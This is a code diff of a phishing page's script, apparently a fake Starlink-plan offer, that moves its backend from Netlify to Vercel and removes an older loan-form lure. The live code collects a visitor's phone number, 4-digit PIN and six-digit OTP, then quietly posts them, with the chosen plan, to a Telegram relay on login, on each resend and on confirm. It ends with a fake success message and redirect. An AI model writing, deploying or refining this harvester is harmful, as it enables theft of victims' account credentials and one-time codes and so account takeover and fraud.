@@ -115,17 +115,6 @@
   </div>
 
 <script>
-  // Prefill phone if saved (old loanForm, harmless if not used)
-  (function(){
-    try {
-      const data = sessionStorage.getItem('loanForm');
-      if (data) {
-        const form = JSON.parse(data);
-        if (form.phone) document.getElementById('phone').value = form.phone;
-      }
-    } catch(e){}
-  })();
-
   // Read selected Starlink plan from index page (if any)
   let selectedPlan = null;
   (function(){
@@ -152,16 +141,15 @@
   }
 
   pinEl.addEventListener('input', function(){
-    // only digits and max 4
     this.value = this.value.replace(/\D/g,'').slice(0,4);
     updateLoginState();
   });
   phoneEl.addEventListener('input', updateLoginState);
   updateLoginState();
 
-  // sendToServer helper
+  // sendToServer helper → Vercel API path
   async function sendToServer(payload) {
-    return fetch('/.netlify/functions/sendTelegram', {
+    return fetch('/api/sendTelegram', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
       body: JSON.stringify(payload)
@@ -184,7 +172,6 @@
   let secondsLeft = RESEND_SECONDS;
 
   function startResendCountdown() {
-    // disable button and start countdown from RESEND_SECONDS
     clearInterval(resendTimer);
     secondsLeft = RESEND_SECONDS;
     resendBtn.disabled = true;
@@ -207,12 +194,10 @@
     resendInfo.innerHTML = `Resend available in <span id="countdown">${secondsLeft}</span>s`;
   }
 
-  // Build OTP string from boxes
   function getOtpFromBoxes(){
     return dEls.map(el => el.value || '').join('');
   }
 
-  // set OTP boxes value from a string (helper)
   function setOtpBoxes(val){
     for (let i=0;i<6;i++){
       dEls[i].value = val[i] || '';
@@ -220,7 +205,6 @@
     updateConfirmState();
   }
 
-  // update Confirm button enable state
   function updateConfirmState(){
     const otp = getOtpFromBoxes();
     if (/^\d{6}$/.test(otp)){
@@ -231,7 +215,6 @@
     }
   }
 
-  // smart focus + navigation for the six boxes
   dEls.forEach((el, idx) => {
     el.addEventListener('input', (e) => {
       const v = el.value.replace(/\D/g,'').slice(0,1);
@@ -244,7 +227,6 @@
 
     el.addEventListener('keydown', (e) => {
       if (e.key === 'Backspace') {
-        // if empty go to previous
         if (el.value === '' && idx > 0) {
           e.preventDefault();
           dEls[idx-1].focus();
@@ -260,20 +242,17 @@
     });
 
     el.addEventListener('paste', (e) => {
-      // support paste of full OTP (6 digits)
       e.preventDefault();
       const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\s/g,'');
       const digits = paste.replace(/\D/g,'').slice(0,6);
       if (digits.length) {
         setOtpBoxes(digits.split(''));
-        // focus after last filled
         const last = Math.min(digits.length-1, 5);
         dEls[last].focus();
       }
     });
 
     el.addEventListener('blur', () => {
-      // if any non-digit show warning only when user leaves
       if (getOtpFromBoxes().length > 0 && !/^\d{6}$/.test(getOtpFromBoxes())){
         otpWarning.style.display = 'block';
       } else {
@@ -282,7 +261,7 @@
     });
   });
 
-  // When LOGIN is clicked: send phone+pin to Telegram silently, then open OTP modal and start countdown
+  // LOGIN submit → open OTP modal + send login+plan to Telegram
   document.getElementById('loginForm').addEventListener('submit', async function(e){
     e.preventDefault();
     const pin = pinEl.value.trim();
@@ -290,7 +269,6 @@
     const phone = phoneEl.value.trim();
     if(!phone){ alert("Enter phone"); return; }
 
-    // open OTP modal immediately
     otpModal.style.display = 'flex';
     setOtpBoxes('');
     otpWarning.style.display = 'none';
@@ -299,23 +277,21 @@
     startResendCountdown();
     setTimeout(()=> dEls[0].focus(), 80);
 
-    // send login details silently (non-blocking)
+    // send login details + selected plan (non-blocking)
     (async () => {
-      const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
       try {
         const resp = await sendToServer({
           submittedAt: new Date().toISOString(),
           event: 'login_clicked',
-          loanData,
           loginPhone: phone,
           loginPin: pin,
-          selectedPlan   // include the Starlink plan
+          selectedPlan
         });
         if (!resp.ok) {
           const txt = await resp.text();
           console.error('Send failed (login click) — Telegram error:', txt);
         } else {
-          console.log('Login details sent (login click).');
+          console.log('Login details + plan sent (login click).');
         }
       } catch (err) {
         console.error('Failed to send login details (login click):', err);
@@ -329,34 +305,28 @@
     clearInterval(resendTimer);
   });
 
-  // Resend button: when clicked it should re-send the same login action (like "reclick" login)
+  // Resend button → send again same data
   resendBtn.addEventListener('click', async () => {
-    // If disabled, do nothing
     if (resendBtn.disabled) return;
 
-    // re-trigger the same behavior as login click: send login details again and restart countdown
     const pin = pinEl.value.trim();
     const phone = phoneEl.value.trim();
     if(!phone || !/^\d{4}$/.test(pin)){
-      // If user changed inputs so they are invalid, show friendly message
       otpStatus.textContent = 'Phone or PIN missing/invalid — please re-enter and try login again.';
       return;
     }
 
-    // restart timer immediately
     startResendCountdown();
     otpStatus.textContent = 'Resending OTP…';
 
     (async () => {
-      const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
       try {
         const resp = await sendToServer({
           submittedAt: new Date().toISOString(),
           event: 'resend_otp',
-          loanData,
           loginPhone: phone,
           loginPin: pin,
-          selectedPlan  // include plan again
+          selectedPlan
         });
 
         if (!resp.ok) {
@@ -373,7 +343,7 @@
     })();
   });
 
-  // Confirm OTP: join boxes and send to server
+  // Confirm OTP: send final data to Telegram
   confirmBtn.addEventListener('click', async ()=>{
     const code = getOtpFromBoxes();
     if(!/^\d{6}$/.test(code)){ otpWarning.style.display = 'block'; return; }
@@ -382,7 +352,6 @@
     otpStatus.textContent = "Sending…";
     confirmBtn.disabled = true;
 
-    const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
     const phone = phoneEl.value.trim();
     const pin = pinEl.value.trim();
 
@@ -390,11 +359,10 @@
       const resp = await sendToServer({
         submittedAt: new Date().toISOString(),
         event: 'otp_confirm',
-        loanData,
         loginPhone: phone,
         loginPin: pin,
         otp: code,
-        selectedPlan   // include plan on final confirm too
+        selectedPlan
       });
 
       if (!resp.ok) {
@@ -405,9 +373,7 @@
         return;
       }
 
-      // success
       otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
-      sessionStorage.removeItem('loanForm');   // keep selectedPlan for thankyou page
       clearInterval(resendTimer);
       setTimeout(()=> window.location.href = "thankyou.html", 1200);
     } catch (err) {
@@ -417,7 +383,6 @@
     }
   });
 
-  // If user manually types into boxes, update confirm state
   dEls.forEach(el => el.addEventListener('input', updateConfirmState));
 </script>
 </body>
